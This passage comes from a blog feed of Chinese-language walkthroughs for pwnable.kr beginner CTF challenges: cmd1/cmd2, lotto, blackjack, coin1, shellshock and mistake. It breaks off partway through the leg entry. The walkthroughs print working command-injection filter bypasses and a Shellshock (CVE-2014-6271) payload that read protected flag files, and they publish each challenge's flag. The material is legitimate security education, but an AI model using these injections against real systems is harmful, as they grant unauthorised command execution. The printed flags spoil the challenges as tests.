id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmd2@ubuntu:/$ /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*'</span><br><span class="line"><span class="meta">$</span><span class="bash">(<span class="built_in">pwd</span>)bin$(<span class="built_in">pwd</span>)cat $(<span class="built_in">pwd</span>)home$(<span class="built_in">pwd</span>)cmd2$(<span class="built_in">pwd</span>)f*</span></span><br><span class="line">FuN_w1th_5h3ll_v4riabl3s_haha</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>FuN_w1th_5h3ll_v4riabl3s_haha</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— cmd1</title>
    <url>/92a446ce.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Mommy! what is PATH environment in Linux?</span><br><span class="line"></span><br><span class="line">ssh cmd1@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh cmd1@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="pcmd1">cmd1</span><a href="#pcmd1" class="header-anchor">#</a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"sh"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"tmp"</span>)!=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">	putenv(<span class="string">"PATH=/thankyouverymuch"</span>);</span><br><span class="line">	<span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	system( argv[<span class="number">1</span>] );</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>注意到：其中对输入的命令进行了过滤，去除了sh，tmp，flag字符</p><ol><li><p>cat方法<br>使用f*代替flag</p></li><li><p>grep方法<br>同上使用通配符</p></li><li><p>环境变量方法<br>建立环境变量，值为flag</p></li></ol><p>除此之外还可以有软链接，执行另一文件等</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmd1@ubuntu:~$ ./cmd1 "/bin/cat f*"</span><br><span class="line">mommy now I get what PATH environment is for :)</span><br><span class="line">cmd1@ubuntu:~$ ./cmd1 "/bin/grep -Rn :"</span><br><span class="line">Binary file cmd1 matches</span><br><span class="line">flag:1:mommy now I get what PATH environment is for :)</span><br><span class="line">/bin/grep: .bash_history: Permission denied</span><br><span class="line">cmd1@ubuntu:~$ export f=flag</span><br><span class="line">cmd1@ubuntu:~$ ./cmd1 "/bin/cat \$f"</span><br><span class="line">mommy now I get what PATH environment is for :)</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>mommy now I get what PATH environment is for :)</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— lotto</title>
    <url>/ca309fdf.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Mommy! I made a lotto program for my homework.</span><br><span class="line">do you want to play?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh lotto@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh lotto@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="plotto-c">lotto.c</span><a href="#plotto-c" class="header-anchor">#</a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> submit[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Submit your 6 lotto bytes : "</span>);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> r;</span><br><span class="line">	r = <span class="built_in">read</span>(<span class="number">0</span>, submit, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Lotto Start!\n"</span>);</span><br><span class="line">	<span class="comment">//sleep(1);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// generate lotto numbers</span></span><br><span class="line">	<span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/urandom"</span>, O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"error. tell admin\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">read</span>(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"error2. tell admin\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">		lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;		<span class="comment">// 1 ~ 45</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">close</span>(fd);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// calculate lotto score</span></span><br><span class="line">	<span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">				match++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// win!</span></span><br><span class="line">	<span class="keyword">if</span>(match == <span class="number">6</span>)&#123;</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"bad luck...\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"- nLotto Rule -\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"nlotto is consisted with 6 random natural numbers less than 46\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"your goal is to match lotto numbers as many as you can\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"if you win lottery for *1st place*, you will get reward\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"for more details, follow the link below\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"mathematical chance to win this game is known to be 1/8145060.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// menu</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> menu;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"- Select Menu -\n"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"1. Play Lotto\n"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"2. Help\n"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"3. Exit\n"</span>);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;menu);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span>(menu)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				play();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				help();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"bye\n"</span>);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"invalid menu\n"</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>注意到：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(i&#x3D;0; i&lt;6; i++)&#123;</span><br><span class="line">	for(j&#x3D;0; j&lt;6; j++)&#123;</span><br><span class="line">		if(lotto[i] &#x3D;&#x3D; submit[j])&#123;</span><br><span class="line">			match++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>循环中，只要自己输入的submit[j] 6个都相同，那么只要与某个lotto[i]一致，就可以破除，所以看下ascii码在1-45中的某个字符尝试输入几次即可</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>使用’++++++'输入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Submit your 6 lotto bytes : ++++++</span><br><span class="line">Lotto Start!</span><br><span class="line">sorry mom... I FORGOT to check duplicate numbers... :(</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>sorry mom... I FORGOT to check duplicate numbers... :(</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— blackjack</title>
    <url>/1c0d597c.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Hey! check out this C implementation of blackjack game!</span><br><span class="line">I found it online</span><br><span class="line">* http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html</span><br><span class="line"></span><br><span class="line">I like to give my flags to millionares.</span><br><span class="line">how much money you got?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9009</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int betting() &#x2F;&#x2F;Asks user amount to bet</span><br><span class="line">&#123;</span><br><span class="line"> printf(&quot;\n\nEnter Bet: $&quot;);</span><br><span class="line"> scanf(&quot;%d&quot;, &amp;bet);</span><br><span class="line"> </span><br><span class="line"> if (bet &gt; cash) &#x2F;&#x2F;If player tries to bet more money than player has</span><br><span class="line"> &#123;</span><br><span class="line">        printf(&quot;\nYou cannot bet more money than you have.&quot;);</span><br><span class="line">        printf(&quot;\nEnter Bet: &quot;);</span><br><span class="line">        scanf(&quot;%d&quot;, &amp;bet);</span><br><span class="line">        return bet;</span><br><span class="line"> &#125;</span><br><span class="line"> else return bet;</span><br><span class="line">&#125; &#x2F;&#x2F; End Function</span><br></pre></td></tr></table></figure><p>可以看到当输入bet后，会与cash比较，数了以后<code>cash=cash-bet</code><br>那么输入一个大的负数，并且输掉应该就可以了</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>输入bet：-100000000，然后选择Stay输掉，再进入下一场即可获得flag</p><p><code>flag</code>：<code>YaY_I_AM_A_MILLIONARE_LOL</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— coin1</title>
    <url>/6060be05.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Mommy, I wanna play a game!</span><br><span class="line">(if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)</span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9007</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="pgame">game</span><a href="#pgame" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">	-              Shall we play a game?              -</span><br><span class="line">	---------------------------------------------------</span><br><span class="line">	</span><br><span class="line">	You have given some gold coins in your hand</span><br><span class="line">	however, there is one counterfeit coin among them</span><br><span class="line">	counterfeit coin looks exactly same as real coin</span><br><span class="line">	however, its weight is different from real one</span><br><span class="line">	real coin weighs 10, counterfeit coin weighes 9</span><br><span class="line">	help me to find the counterfeit coin with a scale</span><br><span class="line">	if you find 100 counterfeit coins, you will get reward :)</span><br><span class="line">	FYI, you have 60 seconds.</span><br><span class="line">	</span><br><span class="line">	- How to play - </span><br><span class="line">	1. you get a number of coins (N) and number of chances (C)</span><br><span class="line">	2. then you specify a set of index numbers of coins to be weighed</span><br><span class="line">	3. you get the weight information</span><br><span class="line">	4. 2~3 repeats C time, then you give the answer</span><br><span class="line">	</span><br><span class="line">	- Example -</span><br><span class="line">	[Server] N=4 C=2 	# find counterfeit among 4 coins with 2 trial</span><br><span class="line">	[Client] 0 1 		# weigh first and second coin</span><br><span class="line">	[Server] 20			# scale result : 20</span><br><span class="line">	[Client] 3			# weigh fourth coin</span><br><span class="line">	[Server] 10			# scale result : 10</span><br><span class="line">	[Client] 2 			# counterfeit coin is third!</span><br><span class="line">	[Server] Correct!</span><br><span class="line"></span><br><span class="line">	- Ready? starting in 3 sec... -</span><br><span class="line">	</span><br><span class="line">N=441 C=9</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>就是写脚本交互计算一下</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def get_weight(begin,end):</span><br><span class="line">        message &#x3D; &quot;&quot;</span><br><span class="line">        if(begin &#x3D;&#x3D; end):</span><br><span class="line">                ssh.sendline(str(begin))</span><br><span class="line">        else:</span><br><span class="line">                for i in range(begin,end + 1):</span><br><span class="line">                        message &#x3D; message + str(i)+&quot; &quot;</span><br><span class="line">                ssh.sendline(message)</span><br><span class="line">        weight &#x3D; ssh.recvline()</span><br><span class="line">        return int(weight)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_result(N,C):</span><br><span class="line">        begin &#x3D; 0</span><br><span class="line">        end &#x3D; N-1</span><br><span class="line">        for i in range(0,C):</span><br><span class="line">                weight &#x3D; get_weight(begin,int(begin+(end-begin)&#x2F;2))</span><br><span class="line">                if(weight%10!&#x3D;0):</span><br><span class="line">                        end &#x3D; int(begin+(end-begin)&#x2F;2)</span><br><span class="line">                else:</span><br><span class="line">                        begin &#x3D; int(begin+(end-begin)&#x2F;2)+1</span><br><span class="line">        ssh.sendline(str(end))</span><br><span class="line">        result &#x3D; ssh.recvline()</span><br><span class="line">        print(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh &#x3D; remote(&#39;0&#39;,9007)</span><br><span class="line">print(ssh.recv())</span><br><span class="line">for i in range(0,100):</span><br><span class="line">        print(&quot;begin to process the %d th&quot;%i)</span><br><span class="line">        question &#x3D; ssh.recvline()</span><br><span class="line">        N &#x3D; int(question.split(&quot; &quot;)[0].split(&quot;&#x3D;&quot;)[1])</span><br><span class="line">        C &#x3D; int(question.split(&quot; &quot;)[1].split(&quot;&#x3D;&quot;)[1])</span><br><span class="line">        print N,C</span><br><span class="line">        get_result(N,C)</span><br><span class="line">print ssh.recvline()</span><br><span class="line">print ssh.recvline()</span><br></pre></td></tr></table></figure><p>连上去速度略慢，所以可以scp到pwnable.kr服务器再运行脚本<code>scp -P 2222 coin.py fd@pwnable.kr:/tmp</code></p><p><code>flag</code>：<code>b1NaRy_S34rch1nG_1s_3asy_p3asy</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— shellshock</title>
    <url>/7a715b77.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Mommy, there was a shocking news about bash.</span><br><span class="line">I bet you already know, but lets just make it sure :)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh shellshock@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh shellshock@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>题目里说了是利用shellshcok漏洞</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shellshock@ubuntu:~$ ls -lth</span><br><span class="line">total 960K</span><br><span class="line">-r-xr-sr-x 1 root shellshock_pwn 8.4K Oct 12  2014 shellshock</span><br><span class="line">-r--r--r-- 1 root root            188 Oct 12  2014 shellshock.c</span><br><span class="line">-r--r----- 1 root shellshock_pwn   47 Oct 12  2014 flag</span><br><span class="line">-r-xr-xr-x 1 root shellshock     937K Oct 12  2014 bash</span><br></pre></td></tr></table></figure><p>权限如上，用shellshock的POC看下是否存在漏洞</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shellshock@ubuntu:~$ env x='() &#123; :;&#125;; echo vulnerable' ./bash -c "echo test"</span><br><span class="line">vulnerable</span><br><span class="line">test</span><br></pre></td></tr></table></figure><p>说明存在</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shellshock@ubuntu:~$ env x='() &#123; :;&#125;; bash -c "cat flag"' ./shellshock </span><br><span class="line">only if I knew CVE-2014-6271 ten years ago..!!</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>only if I knew CVE-2014-6271 ten years ago..!!</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— mistake</title>
    <url>/5488b1c2.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">We all make mistakes, let&#39;s move on.</span><br><span class="line">(don&#39;t take this too seriously, no fancy hacking skill is required at all)</span><br><span class="line"></span><br><span class="line">This task is based on real event</span><br><span class="line">Thanks to dhmonkey</span><br><span class="line"></span><br><span class="line">hint : operator priority</span><br><span class="line"></span><br><span class="line">ssh mistake@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh mistake@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="pmistake-c">mistake.c</span><a href="#pmistake-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line"></span><br><span class="line">#define PW_LEN 10</span><br><span class="line">#define XORKEY 1</span><br><span class="line"></span><br><span class="line">void xor(char* s, int len)&#123;</span><br><span class="line">	int i;</span><br><span class="line">	for(i&#x3D;0; i&lt;len; i++)&#123;</span><br><span class="line">		s[i] ^&#x3D; XORKEY;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	</span><br><span class="line">	int fd;</span><br><span class="line">	if(fd&#x3D;open(&quot;&#x2F;home&#x2F;mistake&#x2F;password&quot;,O_RDONLY,0400) &lt; 0)&#123;</span><br><span class="line">		printf(&quot;can&#39;t open password %d\n&quot;, fd);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printf(&quot;do not bruteforce...\n&quot;);</span><br><span class="line">	sleep(time(0)%20);</span><br><span class="line"></span><br><span class="line">	char pw_buf[PW_LEN+1];</span><br><span class="line">	int len;</span><br><span class="line">	if(!(len&#x3D;read(fd,pw_buf,PW_LEN) &gt; 0))&#123;</span><br><span class="line">		printf(&quot;read error\n&quot;);</span><br><span class="line">		close(fd);</span><br><span class="line">		return 0;		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	char pw_buf2[PW_LEN+1];</span><br><span class="line">	printf(&quot;input password : &quot;);</span><br><span class="line">	scanf(&quot;%10s&quot;, pw_buf2);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; xor your input</span><br><span class="line">	xor(pw_buf2, 10);</span><br><span class="line"></span><br><span class="line">	if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">		printf(&quot;Password OK\n&quot;);</span><br><span class="line">		system(&quot;&#x2F;bin&#x2F;cat flag\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		printf(&quot;Wrong Password\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>只是两次输入异或操作然后比较？<br>输入<code>0000000000</code>再输入<code>11111111111</code>即可</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mistake@ubuntu:~$ .&#x2F;mistake </span><br><span class="line">do not bruteforce...</span><br><span class="line">0000000000</span><br><span class="line">input password : 1111111111</span><br><span class="line">Password OK</span><br><span class="line">Mommy, the operator priority always confuses me :(</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>Mommy, the operator priority always confuses me :(</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— leg</title>
    <url>/232eb954.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Daddy told me I should study arm.</span><br><span class="line">But I prefer to study my leg!</span><br><span class="line"></span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;leg.c</span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;leg.asm</span><br><span class="line"></span><br><span class="line">ssh leg@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh leg@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="pleg-c">leg.c</span><a href="#pleg-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">int key1()&#123;</span><br><span class="line">	asm(&quot;mov r3, pc\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int key2()&#123;</span><br><span class="line">	asm(</span><br><span class="line">	&quot;push	&#123;r6&#125;\n&quot;</span><br><span class="line">	&quot;add	r6, pc, $1\n&quot;</span><br><span class="line">	&quot;bx	r6\n&quot;</span><br><span class="line">	&quot;.code   16\n&quot;</span><br><span class="line">	&quot;mov	r3, pc\n&quot;</span><br><span class="line">	&quot;add	r3, $0x4\n&quot;</span><br><span class="line">	&quot;push	&#123;r3&#125;\n&quot;</span><br><span class="line">	&quot;pop	&#123;pc&#125;\n&quot;</span><br><span class="line">	&quot;.code	32\n&quot;</span><br><span class="line">	&quot;pop	&#123;r6&#125;\n&quot;</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line">int key3()&#123;</span><br><span class="line">	asm(&quot;mov r3, lr\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	int key&#x3D;0;</span><br><span class="line">	printf(&quot;Daddy has very strong arm! : &quot;);</span><br><span class="line">	scanf(&quot;%d&quot;, &amp;key);</span><br><span class="line">	if( (key1()+key2()+key3()) &#x3D;&#x3D; key )&#123;</span><br><span class="line">		printf(&quot;Congratz!\n&quot;);</span><br><span class="line">		int fd &#x3D; open(&quot;flag&quot;, O_RDONLY);</span><br><span class="line">		char buf[100];</span><br><span class="line">		int r &#x3D; read(fd, buf, 100);</span><br><span class="line">		write(0, buf, r);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		printf(&quot;I have strong leg :P\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	return 